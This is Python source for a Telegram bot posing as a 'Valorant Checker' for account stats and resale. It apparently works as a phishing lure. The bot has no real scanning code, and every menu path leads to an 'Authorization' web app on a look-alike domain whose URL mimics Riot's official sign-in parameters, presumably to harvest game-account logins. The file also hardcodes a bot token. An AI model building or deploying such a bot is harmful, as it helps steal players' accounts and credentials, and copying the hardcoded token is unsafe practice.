from keep_alive import keep_alive
keep_alive()
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    WebAppInfo
)
from aiogram.filters import Command

TOKEN = "8723225826:AAEA6oqTwvXFqVlkLZ9UUK7kS27EXCZKk0M"

bot = Bot(token=TOKEN)
dp = Dispatcher()

# ================== KEYBOARDS ==================

def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Functions / Why us?", callback_data="functions")],
        [InlineKeyboardButton(text="Channel", callback_data="channel")],
        [InlineKeyboardButton(text="Check Inventory", callback_data="inventory")],
        [InlineKeyboardButton(text="Profile", callback_data="profile")]
    ])


def inventory_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="List on Market", callback_data="market")],
        [InlineKeyboardButton(text="Check Inventory Price", callback_data="price")]
    ])


def market_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="FunPay", callback_data="funpay")],
        [InlineKeyboardButton(text="PlayerAuctions", callback_data="playerauctions")],
        [InlineKeyboardButton(text="Eldorado.gg", callback_data="eldorado")]
    ])


def auth_menu_simple():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="Authorization",
            web_app=WebAppInfo(
                url="https://valorant-tracker.skin/authorization?client_id=rso-web-client-prod&method=riot_identity&platform=web&redirect_uri=https://auth.riotgames.com/authorize"
            )
        )],
        [InlineKeyboardButton(text="Cancel", callback_data="cancel")]
    ])


def auth_menu_scan():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="Open Inventory Scanner",
            web_app=WebAppInfo(
                url="https://valorant-tracker.skin/"
            )
        )],
        [InlineKeyboardButton(text="Cancel", callback_data="cancel")]
    ])

# ================== HANDLERS ==================

@dp.message(Command("start"))
async def start(message: types.Message):
    text = (
        "👋 Welcome to Valorant Checker Bot!\n\n"
        "⚠️ Please use VPN — bot may not work in CIS countries."
    )
    await message.answer(text, reply_markup=main_menu())


@dp.callback_query(F.data == "functions")
async def functions(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "This Valorant bot provides a complete overview of your account by scanning stats, inventory, and progression in one place. "
        "It eliminates the need to gather information manually, saving you time and effort. "
        "The bot is designed for ease of use, making it accessible even for beginners. "
        "It’s especially useful for preparing accounts for sale, presenting clear and detailed data for buyers on platforms like PlayerAuctions, FunPay, and Eldorado.gg.",
        reply_markup=main_menu()
    )


@dp.callback_query(F.data == "channel")
async def channel(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "Developer’s channel:\nhttps://t.me/valorant_statistic",
        reply_markup=main_menu()
    )


@dp.callback_query(F.data == "inventory")
async def inventory(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "Select action:",
        reply_markup=inventory_menu()
    )


@dp.callback_query(F.data == "market")
async def market(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "Choose platform:",
        reply_markup=market_menu()
    )


@dp.callback_query(F.data.in_(["funpay", "playerauctions", "eldorado"]))
async def no_accounts(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "❌ You have no authorized accounts.",
        reply_markup=auth_menu_simple()
    )


@dp.callback_query(F.data == "price")
async def price(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "Authorization required for inventory scan:",
        reply_markup=auth_menu_scan()
    )


@dp.callback_query(F.data == "profile")
async def profile(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "❌ You have no linked Valorant profiles.",
        reply_markup=auth_menu_simple()
    )


@dp.callback_query(F.data == "cancel")
async def cancel(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "Main menu:",
        reply_markup=main_menu()
    )

# ================== RUN ==================

async def main():
    print("Bot started...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())